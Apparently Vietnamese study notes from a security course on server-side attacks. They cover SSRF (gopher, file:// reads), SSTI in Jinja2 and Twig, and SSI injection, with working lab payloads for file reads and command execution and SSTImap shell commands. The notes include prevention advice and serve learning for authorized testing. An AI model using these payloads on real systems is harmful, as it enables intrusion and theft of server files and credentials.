---
hidden: true
---

# Server-side Attacks

## &#x20;Introduction

## Introduction to Server-side Attacks



### 1. Khái quát

* **Server-side attacks**: nhắm vào ứng dụng/dịch vụ trên **server**.
* Khác với **client-side** (ví dụ: XSS — tấn công trình duyệt).
* Hiểu phân biệt giúp khi **penetration testing** và **bug bounty**.

***

### 2. Các lớp lỗ hổng (tổng quan nhanh)

#### 2.1 SSRF (Server-Side Request Forgery)

* **Khái niệm**: attacker thao túng server để server thực hiện các request trái phép (HTTP, file, gopher, v.v.) dựa trên input của người dùng.
* **Tác hại**: truy cập internal systems, vượt tường lửa, rò rỉ dữ liệu nội bộ.
* **Phát hiện**: kiểm tra các endpoint nhận URL/host từ user; thử chuỗi redirect nội bộ (127.0.0.1, metadata endpoints).
* **Phòng ngừa**: whitelist hosts/IPs, validate/normalize URL, hạn chế khả năng resolver cho các input, sử dụng network-level egress filtering, timeout + circuit breakers.

#### 2.2 SSTI (Server-Side Template Injection)

* **Khái niệm**: injection mã template vào engine server-side do chấp nhận input không an toàn.
* **Tác hại**: data leakage, RCE (nếu engine cho phép biểu thức/thực thi).
* **Phát hiện**: chèn biểu thức template đặc trưng (ví dụ `{{7*7}}` cho các engine kiểu Jinja/Mustache) và kiểm tra kết quả.
* **Phòng ngừa**: tránh render trực tiếp input; dùng context-safe APIs, escape output, tách template logic khỏi dữ liệu, cập nhật/giới hạn quyền template engine.

#### 2.3 SSI Injection (Server-Side Includes)

* **Khái niệm**: SSI directives nhúng nội dung server-side vào HTML; injection xảy ra khi attacker chèn directive độc hại.
* **Tác hại**: rò rỉ file, execution command (nếu server xử lý directive shell), RCE trong trường hợp cấu hình lỏng.
* **Phát hiện**: chèn directive SSI phổ biến (ví dụ `<!--#exec cmd="id"-->`) vào input/đường dẫn xem server thực thi.
* **Phòng ngừa**: tắt SSI nếu không cần, filter/escape input hiển thị trong file HTML, cấu hình webserver từ chối directive từ input.

#### 2.4 XSLT Server-Side Injection

* **Khái niệm**: tấn công vào quá trình transform XML bằng XSLT khi attacker điều khiển stylesheet hoặc dữ liệu.
* **Tác hại**: injection biểu thức XPath/XSLT có thể dẫn đến rò rỉ dữ liệu hoặc thực thi mã trên server (tùy implementation).
* **Phát hiện**: cung cấp stylesheet/parameters độc hại; kiểm tra xem output phản hồi có thay đổi theo payload XSLT.
* **Phòng ngừa**: không cho upload/điều chỉnh XSLT từ user, validate XML/XSLT, chạy transform trong sandbox/with least privilege, cập nhật thư viện XSLT và cấu hình an toàn.



## SSRF

## Introduction to SSRF

* **SSRF**: lỗ hổng xảy ra khi ứng dụng web lấy tài nguyên từ vị trí từ xa dựa trên dữ liệu do người dùng cung cấp (ví dụ: URL), cho phép kẻ tấn công ép server thực hiện request tới URL do họ chỉ định.
* **Hệ quả**: tùy cấu hình ứng dụng, SSRF có thể dẫn đến hậu quả nghiêm trọng (truy cập endpoints nội bộ, vượt tường lửa, rò rỉ dữ liệu).
* **URL scheme thường bị khai thác**:
  * `http://`, `https://` — truy cập HTTP/S (bypass WAF, endpoints nội bộ).
  * `file://` — đọc file cục bộ trên server (LFI thông qua SSRF).
  * `gopher://` — gửi raw bytes, có thể giả lập HTTP POST hoặc giao tiếp với dịch vụ khác (SMTP, DB).
* **Ghi chú**: attacker có thể thao túng scheme; xem module _Modern Web Exploitation Techniques_ để biết kỹ thuật khai thác nâng cao (filter bypasses, DNS rebinding).



## &#x20;Identifying SSRF

**Xác nhận SSRF**: ứng dụng có chức năng "Check Availability" gửi POST tới `/index.php` với tham số `date` và `dateserver` (URL). Server thực hiện fetch theo `dateserver`.

<figure><img src="../../.gitbook/assets/image (574).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (575).png" alt=""><figcaption></figcaption></figure>

* **SSRF không mù (non-blind)**: trỏ `dateserver=http://127.0.0.1/index.php` → response chứa HTML của ứng dụng (title) → nội dung trả về hiển thị cho attacker.
* **Liệt kê dịch vụ (port scan qua SSRF)**: dựa vào khác biệt response khi port đóng (ví dụ lỗi kết nối tới port 81) để suy ra port mở/đóng. Tạo danh sách port:

<figure><img src="../../.gitbook/assets/image (577).png" alt=""><figcaption></figcaption></figure>

<br>

## &#x20;Exploiting SSRF

#### 1. Truy cập các endpoint bị hạn chế

* Ứng dụng lấy dữ liệu từ `dateserver.htb`. Truy cập trực tiếp `http://dateserver.htb:<PORT>/` trả về `403 Forbidden`.
* Tuy nhiên, qua SSRF ta có thể truy cập/điều tra domain này từ server.
* Cách tiếp cận: thực hiện directory brute-force qua SSRF (lọt qua proxy của web server). Xác định trước phản hồi khi trang không tồn tại (ví dụ `404 Not Found`) và một chuỗi có trong trang lỗi mặc định của Apache (`Server at dateserver.htb Port 80`) để lọc kết quả 403/404. Vì ứng dụng chạy PHP, thêm đuôi `.php` khi fuzz.

Ví dụ dùng `ffuf`:

```
ffuf -w fuzz-Bo0oM.txt \
 -u http://10.129.101.44/index.php -X POST \
 -H "Content-Type: application/x-www-form-urlencoded" \
 -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" \
 -fr "Server at dateserver.htb Port 80"
```

* Kết quả mẫu: tìm thấy `/admin.php` và `/availability.php`. Ta có thể truy cập `http://dateserver.htb/admin.php` thông qua `dateserver` POST parameter để lấy thông tin admin (nếu có).

<figure><img src="../../.gitbook/assets/image (579).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (578).png" alt=""><figcaption></figcaption></figure>

***

#### 2. Local File Inclusion (LFI) qua file://

* Nếu server chấp nhận scheme `file://`, ta có thể đọc file cục bộ. Ví dụ:
  * Gửi `dateserver=file:///etc/passwd` trong POST → response trả về nội dung `/etc/passwd`.
* Ứng dụng SSRF có thể dẫn tới LFI, bao gồm đọc source code ứng dụng và các file nhạy cảm khác.

<figure><img src="../../.gitbook/assets/image (580).png" alt=""><figcaption></figcaption></figure>

***

#### 3. Gopher protocol — gửi raw bytes để tạo POST/ứng dụng khác

* Hạn chế: `http://` chỉ gửi GET; nhiều internal endpoints yêu cầu POST (ví dụ form login `/admin.php` với `adminpw` POST parameter).
* Giải pháp: dùng `gopher://` để gửi raw TCP bytes tới host:port, tự build HTTP request (POST) thủ công.

Ví dụ POST mong muốn:

```
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

* Khi tạo gopher URL, mọi ký tự đặc biệt (khoảng trắng, newline) phải URL-encode: space → `%20`, CRLF → `%0D%0A`.
* Gopher URL mẫu (trước encode toàn bộ):

```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

* Do `dateserver` parameter bản thân bị URL-encoded khi gửi trong POST tới ứng dụng, cần encode toàn bộ gopher URL **lần nữa** để tránh lỗi `Malformed URL`. Sau double-encoding, gửi payload qua `dateserver` sẽ khiến web server mở kết nối TCP gửi chính xác bytes ta đã cấu trúc — internal server nhận như một POST hợp lệ và phản hồi tương ứng (ví dụ trả trang Admin Dashboard nếu password đúng).

Ví dụ POST cuối cùng gửi tới ứng dụng:

```
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application%2Fx-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

* Kết quả: internal admin endpoint chấp nhận password gửi qua gopher, trả Admin Dashboard.

***

#### 4. Gopher để tương tác với dịch vụ nội bộ khác

* Gopher không chỉ dùng cho HTTP; có thể tương tác với bất kỳ dịch vụ TCP nội bộ nào (ví dụ SMTP trên port 25).
* Việc cấu trúc gopher URL đúng cú pháp cho từng giao thức có thể phức tạp. Có công cụ hỗ trợ tạo URL gopher tự động.

***

#### 5. Công cụ Gopherus — sinh gopher URL cho nhiều dịch vụ

* Gopherus (Python 2) hỗ trợ sinh gopher payloads cho:
  * MySQL, PostgreSQL, FastCGI, Redis, SMTP, Zabbix, pymemcache, rbmemcache, phpmemcache, dmpmemcache
* Chạy:

```
python2.7 gopherus.py --exploit smtp
```

* Công cụ sẽ hỏi thông tin (from, to, subject, message...) và xuất gopher link tương ứng.

Ví dụ output Gopherus (SMTP):

```
gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.
```

* Gửi link này qua parameter `dateserver` (theo kỹ thuật double-encoding nếu cần) sẽ khiến server gửi mail qua internal SMTP.



## &#x20;Blind SSRF

\
![](<../../.gitbook/assets/image (278).png>)![](<../../.gitbook/assets/image (279).png>)



Ta có thể dễ nhận thấy , đây chính là dạng blind , boolen based , ta sẽ dựa vào dấu hiệu đó để tìm ra port đúng <br>

<figure><img src="../../.gitbook/assets/image (280).png" alt=""><figcaption></figcaption></figure>



## &#x20;Preventing SSRF&#x20;

### 🛡️ Phòng tránh SSRF (Server-Side Request Forgery)

#### 1. Ở tầng ứng dụng (Application layer)

* **Whitelist (danh sách trắng):**
  * Chỉ cho phép server truy xuất đến một số domain/IP đã được định nghĩa trước.
  * Tránh để attacker ép server gọi đến địa chỉ tùy ý (nhất là hệ thống nội bộ).
* **Giới hạn scheme/protocol:**
  * Chỉ cho phép `http`/`https`.
  * Cấm các giao thức nguy hiểm (`file://`, `gopher://`, `ftp://`, …).
* **Hardcode hoặc kiểm tra chặt chẽ URL:**
  * Nếu có thể, code cố định URL thay vì dựa hoàn toàn vào input của người dùng.
* **Input sanitization:**
  * Lọc và xác thực dữ liệu từ người dùng.
  * Ngăn chặn URL bất thường, bypass qua ký tự mã hóa, redirect vòng lặp…

#### 2. Ở tầng mạng (Network layer)

* **Firewall rules:**
  * Chặn request ra ngoài không mong muốn.
  * Ví dụ: chỉ cho phép ra Internet, cấm truy cập IP nội bộ (`127.0.0.1`, `169.254.x.x`, `10.x.x.x`, `192.168.x.x`, …).
* **Network segmentation:**
  * Phân tách mạng nội bộ và mạng public.
  * Giảm nguy cơ attacker lợi dụng SSRF để truy cập hệ thống nhạy cảm.



&#x20;Template Engines<br>
--------------------------

### Template engine là gì

* Phần mềm kết hợp “template” (mẫu cố định) với dữ liệu động để tạo nội dung động.
* Giúp tái sử dụng layout chung (header/footer), giảm lặp, dễ bảo trì.
* Ví dụ: Jinja (Python), Twig (PHP), EJS/Handlebars (JS), Django Templates, Mustache.

### Cách hoạt động (Templating)

* Đầu vào gồm:
  1. Template: chuỗi hoặc file có vị trí chèn dữ liệu.
  2. Dữ liệu: tập key–value.
* Kết quả: quá trình rendering trả về chuỗi đã thế dữ liệu.

### Ví dụ Jinja2

*   Biến đơn:

    ```
    Template:  Hello {{ name }}!
    Data:      {"name": "vautia"}
    Output:    Hello vautia!
    ```
*   Vòng lặp:

    ```
    Template:
    {% for n in names %}
    Hello {{ n }}!
    {% endfor %}

    Data:   {"names": ["vautia","21y4d","Pedant"]}
    Output: Hello vautia!
            Hello 21y4d!
            Hello Pedant!
    ```

### Tính năng thường có

* Biến, điều kiện, vòng lặp.
* Bộ lọc, hàm/macro, include/extend (kế thừa layout).



## &#x20;Introduction to SSTI

Server-side Template Injection (SSTI) xảy ra khi kẻ tấn công có thể chèn mã template vào trong template được server render. Khi đó, mã độc sẽ được thực thi trong quá trình render, có thể dẫn đến việc chiếm quyền điều khiển toàn bộ server.

### Server-side Template Injection

Quá trình render template vốn dĩ liên quan đến việc chèn các giá trị động vào template. Thông thường, các giá trị này được lấy từ người dùng. Nếu được truyền đúng cách vào hàm render, template engine sẽ chỉ thay thế giá trị tại vị trí định sẵn, không thực thi code từ dữ liệu.

SSTI xuất hiện khi đầu vào của người dùng kiểm soát được **chuỗi template** thay vì chỉ là **giá trị**. Khi đó, template engine sẽ coi dữ liệu người dùng là một phần của template và thực thi như code.

### Các tình huống gây SSTI

* **Người dùng được chèn input trực tiếp vào template trước khi gọi hàm render.**
* **Ứng dụng render template nhiều lần:** output từ lần render đầu có chứa dữ liệu người dùng, khi đưa vào render lại sẽ coi dữ liệu đó như template.
* **Ứng dụng cho phép sửa hoặc nộp template:** rõ ràng tạo ra lỗ hổng vì attacker có thể đưa code template độc hại.



## &#x20;Identifying SSTI

* Chỉ test trên môi trường bạn có quyền (lab, pentest được ủy quyền).
* Bắt đầu bằng payload không gây hại (tính toán đơn/ gây lỗi cú pháp) để phát hiện hành vi.
* Ghi nhận phản hồi HTTP, nội dung trang, và header để so sánh.
* URL-encode/escape payload khi cần để tránh lọt vào phần lọc đơn giản trước khi tới engine.
* Đừng thử payload khai thác RCE trên hệ thống thực mà không có phép.

### Checklist bước-bước an toàn khi kiểm thử

* Nếu ứng dụng render cùng một template nhiều lần và đầu ra lần 1 chứa input người dùng rồi được đưa làm template cho lần 2 → input ban đầu có thể trở thành **chuỗi template** trong lần render tiếp theo, dẫn tới SSTI thứ cấp.
* Ứng dụng cho phép người dùng sửa/submit template là tình huống rất dễ dẫn tới SSTI.

### Các tình huống dễ gây nhầm lẫn

* Jinja (Python): cú pháp `{{ }}` và `{% %}`, thao tác chuỗi/ số có đặc thù Python.
* Twig (PHP): cú pháp tương tự `{{ }}` nhưng hành vi toán học/chuỗi khác với Jinja.
* ERB, Velocity, FreeMarker, Handlebars… mỗi engine có cú pháp/ hàm khác; dùng payload nhỏ để phân biệt.

### &#x20;`foobar`

Biểu thức kiểu `${foobar}` chỉ là **payload thử nghiệm ban đầu** để đoán xem ứng dụng có dính SSTI hay không và engine template có xử lý theo cú pháp nào. Nhưng nó **không áp dụng chung cho mọi trường hợp**:

* Với **Jinja2 (Python Flask, Django template)**: thường dùng `{{foobar}}` chứ không phải `${foobar}`.
* Với **ERB (Ruby)**: dùng `<%= foobar %>`.
* Với **Twig (PHP)**: dùng `{{ foobar }}`.
* Với **Velocity (Java)**: mới dùng `${foobar}`.
* Với **Freemarker (Java)**: lại dùng `${foobar}` hoặc `${foobar?c}`.
* Với **Smarty (PHP)**: `{foobar}`.

👉 Do đó `${foobar}` **chỉ xác định được engine nào dùng ký hiệu `$` với `{}`**, thường gặp trong Java (Velocity, Freemarker). Còn để xác định **toàn bộ** TH SSTI thì phải fuzz nhiều payload khác nhau (danh sách syntax phổ biến của PortSwigger, PayloadsAllTheThings).

### Một số engine và khác biệt cần chú ý

1. Thử `${7*7}` — nếu thực thi (kết quả 49) → theo nhánh thích hợp; nếu không → tiếp.
2. Thử `{{7*7}}` — nếu kết quả hiển thị `49` thì engine có cú pháp `{{ }}` (như Jinja/Twig/Handlebars…); nếu không thực thi, thử biến thể khác.
3. Dùng payload làm khác biệt hành vi giữa các engine, ví dụ `{{7*'7'}}`:
   * Trên một số engine (Jinja) kết quả có thể là chuỗi lặp `7777777` (do nhân chuỗi),
   * Trên engine khác (Twig) kết quả có thể là `49` (do ép kiểu/ toán học).\
     Kết quả chuỗi/ số khác nhau giúp suy luận engine.

Dùng payload biểu thức toán học/chuỗi đơn giản để phân biệt engine bằng cách quan sát kết quả. Luồng phổ biến:

### Identifying the template engine — chiến lược

1. Gửi input (ví dụ `name`) chứa payload kiểm thử tới form/endpoint hiển thị lại giá trị.
2. Quan sát: lỗi máy chủ, đầu ra bất thường, hoặc payload được tính toán/hiển thị.
3. Lưu ý: Một lỗi không khẳng định chắc chắn SSTI, nhưng là tín hiệu cần điều tra sâu hơn.

### Confirming SSTI — ví dụ thao tác

<figure><img src="../../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

* Nếu server trả lỗi (ví dụ HTTP 500 Internal Server Error) sau khi chèn payload này vào tham số phản chiếu, độ nghi ngờ về SSTI tăng lên — tương tự như chèn dấu `'` để phát hiện SQLi.

```
${{<%[%'"}}}%\.
```

* Payload thử gây lỗi (chứa hầu hết ký tự đặc biệt có ý nghĩa trong nhiều engine):



### Confirming SSTI — payload kiểm thử mẫu

Cách hiệu quả tương tự như kiểm thử injection khác: chèn các ký tự/cú pháp có ý nghĩa với template engine và quan sát phản hồi. Nếu template engine đang thực thi hoặc báo lỗi liên quan đến cú pháp template, tham số có thể bị ảnh hưởng.

### Confirming SSTI — ý tưởng chung

Mục tiêu khi xác định SSTI là (1) xác nhận tham số có khả năng bị chèn mã template và (2) biết template engine đang dùng, vì cú pháp và khả năng khai thác thay đổi tùy engine.

### Identifying SSTI — mục đích

<br>

## Exploiting SSTI - Jinja2



### Giả định

Giả sử đã xác định được ứng dụng web dùng template engine Jinja (ví dụ ứng dụng Flask). Phần dưới chỉ tập trung vào khai thác SSTI trên Jinja2, không lặp lại các bước xác nhận hay nhận diện engine.

### Quyền truy cập thư viện

Trong payload Jinja có thể sử dụng các thư viện đã được ứng dụng Python import sẵn (trực tiếp hoặc gián tiếp). Ngoài ra, có thể gọi `__import__` từ `__builtins__` để import thêm các thư viện nếu cần.

### Tiết lộ thông tin

Có thể dùng SSTI để thu thập thông tin cấu hình và mã nguồn ứng dụng. Ví dụ dump cấu hình ứng dụng:

```jinja2
{{ config.items() }}
```

<figure><img src="../../.gitbook/assets/image (282).png" alt=""><figcaption></figcaption></figure>



Hoặc lấy danh sách các built-in Python:

<figure><img src="../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```

### Local File Inclusion (LFI)

Dùng `open` từ `__builtins__` để đọc file cục bộ (ví dụ `/etc/passwd`) — cần truy cập qua `__builtins__`:

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

<figure><img src="../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>

### Remote Code Execution (RCE)

Để thực thi lệnh hệ thống có thể import module `os` rồi gọi `popen`/`system` qua `__import__`:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

<figure><img src="../../.gitbook/assets/image (285).png" alt=""><figcaption></figcaption></figure>



## &#x20;Exploiting SSTI - Twig

<br>

### Exploiting SSTI — Twig

Giả định: đã xác định được ứng dụng web dùng template engine **Twig** (PHP). Phần dưới chỉ tập trung vào cách khai thác SSTI trên Twig — không lặp lại bước xác nhận hay nhận diện engine.

### Information Disclosure

*   Trong Twig, biến đặc biệt như `_self` cho biết thông tin cơ bản về template hiện tại:

    ```twig
    {{ _self }}
    ```

    Kết quả cung cấp rất hạn chế so với Jinja nhưng vẫn có thể hữu ích để hiểu cấu trúc template.

<figure><img src="../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>

### Local File Inclusion (LFI)

*   Twig core không cung cấp trực tiếp hàm đọc file hệ thống, nhưng các framework (ví dụ Symfony) có thể mở rộng Twig bằng các filter hữu ích. Một filter điển hình là `file_excerpt`, có thể dùng để đọc nội dung file cục bộ:

    ```twig
    {{ "/etc/passwd"|file_excerpt(1,-1) }}
    ```

    * Nếu filter này tồn tại và không bị hạn chế, attacker có thể đọc file nhạy cảm.
    * Việc filter có sẵn hay không phụ thuộc vào framework và cấu hình.

<figure><img src="../../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

### Remote Code Execution (RCE)

*   Twig cho phép gọi các filter/hàm PHP nếu chúng được expose. Một kỹ thuật thường dùng là truyền mảng giá trị vào filter `system` (hoặc filter khác thực thi lệnh):

    ```twig
    {{ ['id'] | filter('system') }}
    ```

    * Nếu `system` (hoặc `exec`, `passthru`, v.v.) khả dụng qua filter, payload này có thể thực thi lệnh hệ thống.
    * Khả năng thực thi phụ thuộc vào những hàm nào được expose trong môi trường Twig/Symfony và các hạn chế của PHP (disable\_functions, suhosin, v.v.).

<figure><img src="../../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>

### Further Remarks

* Cú pháp và khả năng khai thác giữa các template engine khác nhau: Jinja vs Twig có hành vi và payload khác nhau.
* Một attacker không quen engine cụ thể có thể học cú pháp và filter/hàm hỗ trợ bằng cách tham khảo tài liệu engine hoặc bộ cheat-sheets (ví dụ PayloadsAllTheThings SSTI CheatSheet).
* Mức rủi ro thực tế (information disclosure, LFI, RCE) phụ thuộc vào: biến/hàm/filter được expose, cấu hình framework, và các hàm PHP bị vô hiệu hóa.

### Ethical and safety note

* Nội dung trên mang tính kỹ thuật/giáo dục. Chỉ tiến hành kiểm thử hoặc khai thác trên hệ thống mà bạn **có quyền rõ ràng** (môi trường lab hoặc được ủy quyền).
* Khi phát hiện lỗ hổng, báo cáo có trách nhiệm (responsible disclosure) cho chủ hệ thống hoặc áp dụng biện pháp khắc phục (tách dữ liệu khỏi template, whitelist, disable dynamic template loading, giới hạn filter/hàm).





## &#x20;SSTI Tools of the Trade & Preventing SSTI

\
SSTI Tools of the Trade & Preventing SSTI

Phần này trình bày các công cụ giúp xác định và khai thác lỗ hổng SSTI. Đồng thời tóm tắt ngắn cách phòng tránh các lỗ hổng này.

### Tools of the Trade

Công cụ phổ biến nhất để xác định và khai thác SSTI trước đây là **tplmap**. Tuy nhiên, tplmap hiện không còn được duy trì và chạy trên Python2 đã lỗi thời. Do đó, ta sẽ dùng công cụ hiện đại hơn là **SSTImap** để hỗ trợ quá trình khai thác SSTI. Ta có thể chạy nó sau khi clone repository và cài các phụ thuộc:

```bash
SSTI Tools of the Trade & Preventing SSTI
0xlc13n@htb[/htb]$ git clone https://github.com/vladko312/SSTImap

0xlc13n@htb[/htb]$ cd SSTImap

0xlc13n@htb[/htb]$ pip3 install -r requirements.txt

0xlc13n@htb[/htb]$ python3 sstimap.py 
```

Khi khởi chạy, SSTImap hiển thị thông tin phiên bản và plugin đã load:

```
    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗ ║ ║ ║{║ _ __ ___ __ _ _ __
    ╚════╗ ╠════╗ ║ ║ ║ ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║ ║ ║ ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝ ╚═╝ ╚╦╝ |_| |_| |_|\__,_| .__/
                             │ | |
                                                |_|
[*] Version: 1.2.0
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state, and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 5; engines: 17; legacy_engines: 2
[*] Loaded request body types: 4
[-] SSTImap requires target URL (-u, --url), URLs/forms file (--load-urls / --load-forms) or interactive mode (-i, --interactive)
```

Để tự động nhận diện bất kỳ lỗ hổng SSTI nào cũng như template engine mà ứng dụng web sử dụng, ta cần cung cấp SSTImap với URL mục tiêu:

```bash
SSTI Tools of the Trade & Preventing SSTI
0xlc13n@htb[/htb]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test
```

\<SNIP>

Kết quả mẫu khi SSTImap phát hiện injection point:

```
[+] SSTImap identified the following injection point:

  Query parameter: name
  Engine: Twig
  Injection: *
  Context: text
  OS: Linux
  Technique: render
  Capabilities:
    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, php code
```

Như ta thấy, SSTImap xác nhận lỗ hổng SSTI và xác định thành công template engine là **Twig**. Công cụ cũng liệt kê các capability có thể sử dụng khi khai thác. Ví dụ, ta có thể download file từ máy mục tiêu về máy local bằng flag `-D`:

```bash
SSTI Tools of the Trade & Preventing SSTI
0xlc13n@htb[/htb]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
```

\<SNIP>

```
[+] File downloaded correctly
```

Ngoài ra, ta có thể thực thi lệnh hệ thống bằng flag `-S`:

```bash
SSTI Tools of the Trade & Preventing SSTI
0xlc13n@htb[/htb]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
```

\<SNIP>

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Hoặc dùng `--os-shell` để lấy một interactive shell:

```bash
SSTI Tools of the Trade & Preventing SSTI
0xlc13n@htb[/htb]$ python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```

\<SNIP>

```
[+] Run commands on the operating system.
Linux $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Linux $ whoami
www-data
```

### Prevention

Để ngăn chặn SSTI, phải đảm bảo rằng input của người dùng **không bao giờ** được truyền vào tham số template khi gọi hàm render của template engine. Việc này đạt được bằng cách rà soát kỹ các luồng mã và đảm bảo input người dùng không bị thêm vào template trước khi gọi hàm render.

Nếu một web application có yêu cầu cho phép người dùng sửa template hiện có hoặc upload template mới vì lý do nghiệp vụ, cần thực hiện các biện pháp hardening để ngăn chặn việc chiếm quyền server. Quá trình hardening có thể bao gồm loại bỏ các hàm nguy hiểm có thể dẫn tới RCE khỏi môi trường thực thi của template engine. Việc loại bỏ các hàm nguy hiểm sẽ ngăn attacker sử dụng các hàm đó trong payload. Tuy nhiên, kỹ thuật này dễ bị bypass. Cách tiếp cận tốt hơn là tách hoàn toàn môi trường thực thi của template engine khỏi web server — ví dụ chạy trong một execution environment riêng như Docker container.



\
Server-Side Includes (SSI) là một công nghệ mà các web application sử dụng để tạo nội dung động trên các trang HTML. SSI được nhiều web server phổ biến hỗ trợ, chẳng hạn **Apache** và **IIS**. Việc sử dụng SSI thường có thể suy ra từ phần mở rộng (file extension). Các phần mở rộng tiêu biểu bao gồm **.shtml**, **.shtm**, và **.stm**. Tuy nhiên, web server có thể được cấu hình để hỗ trợ SSI directives trong bất kỳ phần mở rộng tệp nào. Do vậy, ta không thể kết luận chắc chắn chỉ dựa vào phần mở rộng file là có dùng SSI hay không.

### SSI Directives

SSI sử dụng các directive để thêm nội dung động vào một trang HTML tĩnh. Các directive này gồm các thành phần sau:

* **name:** tên directive
* **parameter name:** một hoặc nhiều tham số
* **value:** một hoặc nhiều giá trị tham số

Cú pháp của một SSI directive như sau:

```html
<!--#name param1="value1" param2="value2" -->
```

Ví dụ một số SSI directive phổ biến.

#### printenv

Directive này in ra các environment variables. Nó không nhận tham số nào.

```html
<!--#printenv -->
```

#### config

Directive này thay đổi cấu hình SSI bằng cách chỉ định các tham số tương ứng. Ví dụ, nó có thể thay đổi thông báo lỗi bằng tham số `errmsg`:

```html
<!--#config errmsg="Error!" -->
```

#### echo

Directive này in giá trị của bất kỳ biến nào được chỉ định trong tham số `var`. Có thể in nhiều biến bằng cách chỉ định nhiều tham số `var`. Ví dụ các biến được hỗ trợ:

* **DOCUMENT\_NAME:** tên file hiện tại
* **DOCUMENT\_URI:** URI của file hiện tại
* **LAST\_MODIFIED:** timestamp lần sửa đổi cuối của file hiện tại
* **DATE\_LOCAL:** thời gian máy chủ theo giờ địa phương

```html
<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
```

#### exec

Directive này thực thi lệnh được cung cấp trong tham số `cmd`:

```html
<!--#exec cmd="whoami" -->
```

#### include

Directive này bao gồm (include) file được chỉ định trong tham số `virtual`. Nó chỉ cho phép include các file nằm trong web root directory.

```html
<!--#include virtual="index.html" -->
```

### SSI Injection

SSI injection xảy ra khi kẻ tấn công có thể chèn các SSI directive vào một file mà sau đó web server phục vụ, dẫn tới việc các SSI directive bị chèn được thực thi. Kịch bản này có thể xảy ra trong nhiều trường hợp. Ví dụ: khi web application có lỗ hổng upload file cho phép attacker upload file chứa SSI directive độc hại vào web root directory. Ngoài ra, attacker cũng có thể chèn SSI directive nếu web application ghi (write) dữ liệu người dùng vào một file trong web root directory.



Bây giờ ta đã thảo luận cách SSI hoạt động, hãy xem cách khai thác SSI injection.



## &#x20;Exploiting SSI Injection

<br>



Xét ví dụ ứng dụng web mẫu. Trang đầu hiển thị một form đơn giản yêu cầu nhập tên:

<figure><img src="../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

Simple Test Server page with a form to enter your name and a submit button.

Nếu ta nhập tên, ta được chuyển hướng tới `/page.shtml`, trang này hiển thị một số thông tin chung:

<figure><img src="../../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

\
Simple Test Server page displaying greeting 'Hi vautia!', IP address, and current time.

Ta có thể suy đoán trang hỗ trợ SSI dựa vào phần mở rộng file. Nếu username của ta được chèn vào trang mà không được sanitize trước, nó có thể bị SSI injection. Xác nhận bằng cách gửi username là:

```html
<!--#printenv -->
```

Kết quả trên trang:

<figure><img src="../../.gitbook/assets/image (272).png" alt=""><figcaption></figcaption></figure>

Như thấy, directive đã được thực thi và các environment variables được in ra. Vậy là ta xác nhận được lỗ hổng SSI injection. Tiếp theo xác nhận có thể thực thi lệnh tuỳ ý bằng directive `exec` với username:

```html
<!--#exec cmd="id" -->
```

Kết quả trang:

<figure><img src="../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

Server đã thực thi lệnh được chèn. Điều này cho phép ta có khả năng chiếm quyền điều khiển server web hoàn toàn.

### Preventing SSI Injection

Như đã thấy, triển khai SSI không đúng cách có thể dẫn tới các lỗ hổng nghiêm trọng. SSI injection có thể gây hậu quả nặng, bao gồm **remote code execution** và thậm chí chiếm quyền **web server**. Để ngăn chặn SSI injection, ứng dụng web sử dụng **SSI** phải triển khai các biện pháp bảo mật phù hợp.

### Prevention

